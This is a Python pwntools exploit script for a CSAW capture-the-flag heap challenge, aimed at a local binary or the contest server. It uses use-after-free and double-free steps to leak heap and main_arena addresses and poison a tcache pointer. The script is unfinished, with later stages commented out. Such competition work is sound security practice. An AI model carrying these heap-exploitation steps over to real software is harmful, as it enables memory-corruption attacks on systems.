#!/usr/bin/python3

from contextlib import contextmanager

from pwn import *

context(log_level="debug")
context.terminal = ["tmux", "split-window", "-h"]

FILE = "chal"
HOST, PORT = "chals.ctf.csaw.io", 21006
PAYLOAD_SIZE = 0xF0
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


def br(func, off=0):
    return f"b *{func} + {off}"

def gdb_script(*args):
    return "\n".join(args) + "\n"
gdbscript = gdb_script(
    br("add_dish"),
)


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            # elf._populate_symbols()
            context.binary = elf

            # target = (
            #     gdb.debug(
            #         [ld.path, elf.path] + (argv or []),
            #         gdbscript=gdbscript,
            #         aslr=aslr,
            #         env={"LD_PRELOAD": libc.path},
            #     )
            #     if debug
            #     else process([elf.path] + (argv or []), env=envp)
            # )
            
            target = process([elf.path] + (argv or []), env=envp,aslr=aslr)
            log.info(f"PID: {target.pid}")
            if debug:
                gdb.attach(target, gdbscript=gdbscript)
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def add(p: process, slot, type_idx, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b": ", str(slot).encode())
    p.sendlineafter(b": ", str(type_idx).encode())
    p.sendlineafter(b": ", data)


def delete(p: process, slot):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b": ", str(slot).encode())


def show(p: process, slot):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b": ", str(slot).encode())
    return p.recvuntil(b"[")  # adapt to output format


def edit(p: process, slot, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b": ", str(slot).encode())
    p.sendlineafter(b": ", data)

def decrypt_tha_shi(rcv):
    from subprocess import Popen, PIPE

    p = Popen(["./t", rcv], stdout=PIPE, stderr=PIPE)
    out, err = p.communicate()
    ossl_d = bytes.fromhex(out.strip().decode())
    return ossl_d

def addr(addr, heap_leak):
    return (heap_leak >> 12) ^ (addr & 0xFFFFFFFFFFFFF000)

def attack(io):
    add(io, 0, 4, b"")
    add(io, 1, 4, b"")
    delete(io, 1)
    add(io, 2, 4, b"") # same addr as 1
    delete(io, 0)
    delete(io, 1)
    rcv = show(io, 2)
    rcv = rcv.split(b"\n")[0][::-1].hex()
    log.info(f"leak: {rcv}")
    heap_val = decrypt_tha_shi(rcv)
    log.info(f"heap base: {heap_val.hex()}")
    
    heap_leak = int(heap_val.hex(), 16)
    
    poisoned_fd = addr(heap_leak+0x4000, heap_leak)

    edit(io, 2, p64(poisoned_fd))
    add(io, 5, 4, b"")
    add(io, 6, 4, b"") # <- contains poisoned fd
    
    for i in range(7):
        add(io, 7 + i, 1, b"")
    
    add(io, 1, 1, b"")
    add(io, 3, 1, b"")
    delete(io, 3)
    add(io, 5, 1, b"") # allow us to write in 3
    add(io, 4, 2, b"")
    
    for i in range(7):
        delete(io, 7 + i)
    
    delete(io, 3)
    delete(io, 1)
    
    res = show(io, 5)
    
    
    
    add(io, 14, 1, b"")
    delete(io, 14)
    add(io, 15, 1, b"")
    delete(io, 14)
    
    main_arena = show(io, 15)
    main_arena = main_arena.split(b"\n")[0][::-1].hex()
    # main_arena_val = decrypt_tha_shi(main_arena)
    log.info(f"main_arena: {main_arena}")
    # delete(io, 1)
    # add(io, 7, 4, b"")
    # delete(io, 1)
    # delete(io, 0)

    # add(io, 0, 4, b"")
    # delete(io, 0)
    # add(io, 1, 4, b"")
    # edit(io, 1, b"AAAAAAAA")
    io.interactive()


def main():
    try:
        with launch(debug=True,aslr=True) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
